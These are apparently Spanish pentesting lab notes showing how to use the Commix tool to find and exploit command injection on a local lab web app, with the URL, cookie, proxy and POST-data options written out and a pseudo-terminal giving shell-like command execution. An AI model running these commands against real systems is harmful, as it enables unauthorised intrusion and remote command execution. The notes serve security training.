<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Commix</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Commix</h1><br/><p></p><p><h1>COMMIX</h1>:</p><p></p><p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a></p><p></p><p>Commix puede que sea la referencia cuando hablamos de inyecciones de comandos</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> apt <span style="color:#000000;font-weight:700">install</span> commix</pre></div></p><p></p><p>Vamos a ver algunos casos de uso genéricos en nuestro laboratorio virtual:</p><p></p><p><a href="http://192.168.20.133:1335/">http://192.168.20.133:1335/</a></p><p>Login admin password </p><p></p><p><img src="images/110-1.png" alt="images/110-1.png" /></p><p></p><p><div class="codebox"><pre><br />commix -u http<span style="color:#000000;font-weight:700">://</span>192.168.20.133<span style="color:#000000;font-weight:700">:</span>1335<span style="color:#000000;font-weight:700">/</span>vulnerabilities<span style="color:#000000;font-weight:700">/</span>exec<span style="color:#000000;font-weight:700">/</span></pre></div></p><p></p><p></p><p>Si no encuentra ningún parámetro o no puede acceder por requerir un login tenemos algunas opciones:</p><p></p><p><div class="codebox"><pre><br />commix -u http<span style="color:#000000;font-weight:700">://</span>192.168.20.133<span style="color:#000000;font-weight:700">:</span>1335<span style="color:#000000;font-weight:700">/</span>vulnerabilities<span style="color:#000000;font-weight:700">/</span>exec<span style="color:#000000;font-weight:700">/</span> --level 3</pre></div></p><p></p><p>Indica que busque además de en la url en otros prámetros del codigo fuente.</p><p></p><p>Podemos indicarle un proxy </p><p></p><p><div class="codebox"><pre><br />commix -u http<span style="color:#000000;font-weight:700">://</span>192.168.20.133<span style="color:#000000;font-weight:700">:</span>1335<span style="color:#000000;font-weight:700">/</span>vulnerabilities<span style="color:#000000;font-weight:700">/</span>exec<span style="color:#000000;font-weight:700">/</span> --level 3 --proxy http<span style="color:#000000;font-weight:700">://</span>127.0.0.1<span style="color:#000000;font-weight:700">:</span>4444</pre></div></p><p></p><p></p><p>Cuando la aplicación web tiene una autenticación podemos indicar lo siguiente:</p><p></p><p>Con Burpsuite accedemos a la web y nos logeamos, lo que significa que se crea una cookie de sesión</p><p></p><p><img src="images/110-2.png" alt="images/110-2.png" /></p><p></p><p>Si la capturamos podemos copiar la cadena de la cookie session y la indicamos en commix:</p><p></p><p><div class="codebox"><pre><br />commix -u http<span style="color:#000000;font-weight:700">://</span>192.168.20.133<span style="color:#000000;font-weight:700">:</span>1335<span style="color:#000000;font-weight:700">/</span>vulnerabilities<span style="color:#000000;font-weight:700">/</span>exec<span style="color:#000000;font-weight:700">/</span> --cookie=<span style="color:#edd400;font-weight:400">&quot;PHPSESSID=hsvemq0vu2ti7mv8gqsi7p7gb6; security=low&quot;</span> --proxy http<span style="color:#000000;font-weight:700">://</span>127.0.0.1<span style="color:#000000;font-weight:700">:</span>4444</pre></div></p><p></p><p><img src="images/110-3.png" alt="images/110-3.png" /></p><p></p><p>no encuentra parámetros pero no redirecciona.</p><p></p><p>No encuentra parámetros porque por defecto los busca en la URL pero en este caso el parámetro que buscamos se encuentra en el body:</p><p></p><p><img src="images/110-4.png" alt="images/110-4.png" /></p><p></p><p>Copiamos el parámetro:</p><p></p><p><div class="codebox"><pre><br />commix -u http<span style="color:#000000;font-weight:700">://</span>192.168.20.133<span style="color:#000000;font-weight:700">:</span>1335<span style="color:#000000;font-weight:700">/</span>vulnerabilities<span style="color:#000000;font-weight:700">/</span>exec<span style="color:#000000;font-weight:700">/</span> --cookie=<span style="color:#edd400;font-weight:400">&quot;PHPSESSID=hsvemq0vu2ti7mv8gqsi7p7gb6; security=low&quot;</span> --proxy http<span style="color:#000000;font-weight:700">://</span>127.0.0.1<span style="color:#000000;font-weight:700">:</span>4444 --data=<span style="color:#edd400;font-weight:400">&quot;ip=192.168.20.133&amp;Submit=Submit&quot;</span><br /></pre></div></p><p></p><p><img src="images/110-5.png" alt="images/110-5.png" /></p><p></p><p><img src="images/110-6.png" alt="images/110-6.png" /></p><p></p><p>Pasado un rato ha sido capaz de encontrar un parámetro vulnerable:</p><p></p><p><img src="images/110-7.png" alt="images/110-7.png" /></p><p></p><p>Además pregunta si queremos una pseudo-terminal o falsa terminal.</p><p></p><p>Esto nos proporciona una terminal en la que podemos introducir comandos naturales y automáticamente trata de inyectarlos en el servidor mediante el parámetro vulnerable que acaba de encontrar.</p><p></p><p>Por lo tanto es como si estuviesemos ejecutando los comandos en el servidor de la aplicación web mediante una reverse shell:</p><p></p><p><img src="images/110-8.png" alt="images/110-8.png" /></p><p></p><p></p></div>
</body>
</html>
